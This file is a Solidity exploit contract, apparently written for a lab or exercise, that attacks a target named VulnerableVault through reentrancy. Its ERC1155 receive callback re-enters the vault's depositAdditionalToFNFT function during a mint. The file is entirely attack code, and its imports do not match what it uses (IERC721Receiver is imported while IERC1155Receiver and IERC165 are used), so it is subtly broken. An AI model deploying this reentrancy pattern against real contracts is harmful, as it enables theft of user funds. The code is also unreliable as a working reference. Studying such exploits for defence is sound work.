// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./VulnerableVault.sol";

contract Attacker is IERC1155Receiver {
    VulnerableVault public nft;
    uint256 public countReceived;
    uint256 public idDeposit;
    uint256 public constant quantity = 1;
    uint256 public constant depositAmount = 1 ether;
    constructor(address payable nftAddress) {
        nft = VulnerableVault(nftAddress);
    }

    function attack() external {
        nft.mintFNFT(2, 0);
        nft.mintFNFT(10, 0);
    }

    function onERC1155Received(
        address,
        address,
        uint256 id,
        uint256,
        bytes memory
    ) public returns (bytes4) {
        ++countReceived;
        if(countReceived == 1){
            idDeposit = id;
        }
        if(countReceived == 2) {
            nft.depositAdditionalToFNFT{
                value: quantity * depositAmount
            }(idDeposit, quantity, depositAmount);
        }
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address,
        address,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) public pure returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

    // Implements the supportsInterface function to comply with IERC165
    function supportsInterface(bytes4 interfaceId) external view override returns (bool) {
        return interfaceId == type(IERC1155Receiver).interfaceId || interfaceId == type(IERC165).interfaceId;
    }

    receive() external payable {}
}
